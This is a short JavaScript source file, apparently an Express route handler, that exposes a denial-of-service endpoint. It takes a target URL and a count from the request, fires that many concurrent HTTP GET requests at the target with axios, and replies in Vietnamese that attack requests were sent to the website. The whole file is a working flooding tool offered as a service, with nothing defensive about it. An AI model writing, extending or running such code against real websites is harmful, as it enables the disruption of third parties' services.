import axios from "axios";

async function Ddos(link, max) {
  let failed = 0;
  let count = 0;
  const requests = [];

  for (let i = 0; i < max; i++) {
    requests.push(axios.get(link).catch((error) => {
      failed++;
    }));
  }
  await Promise.all(requests);
}

function isValidURL(str) {
  const urlPattern =
    /^(https?:\/\/)?([\w-]+(\.[\w-]+)+)([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?$/;
  return urlPattern.test(str);
}

export const sendDdos = async (req, res) => {
  if (isNaN(req.query.max)) {
    return res.status(400).json({
      code: 400,
      message: "Số lần tấn công phải là số",
    });
  }
  if (isValidURL(req.query.link)) {
     Ddos(req.query.link, req.query.max);
  } else {
    return res.status(400).json({
      code: 400,
      message: "Link sai định dạng",
    });
  }
  res.status(200).json({
    code: 200,
    message: `Đã gửi request tấn công website: ${req.query.link}`,
  });
};